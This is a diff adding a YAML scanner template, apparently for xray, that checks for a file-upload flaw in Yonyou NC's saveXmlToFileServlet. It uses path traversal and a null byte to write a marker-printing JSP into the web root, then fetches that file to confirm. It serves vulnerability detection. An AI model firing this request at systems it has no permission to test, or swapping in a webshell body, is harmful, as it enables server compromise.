@@ -1,0 +1,31 @@
+name: poc-yaml-yongyouNC-saveXmlToFIleServlet-File-upload-XVE-2024-6507
+transport: http
+
+set:
+  username: randomLowercase(6)
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=..\\..\\..\\webapps\\nc_web\\{{username}}.jsp%00
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+        Content-Type: application/octet-stream
+      body: |
+        %3C%25out.print%28%22pboyjnnrfipmplsukdeczudsefxmywe%22%29%3B%25%3E
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /{{username}}.jsp
+    expression: response.status == 200 && response.body.bcontains(b'pboyjnnrfipmplsukdeczudsefxmywe')
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488162&idx=1&sn=c0a4ed867540fb32daba33e4c392a250&chksm=c267a791f5102e875ebe58fe417f4739c0bda6ea739daedfedfd8c6a8a1036608e04973a2bf6&token=350950895&lang=zh_CN#rd
+
+
+
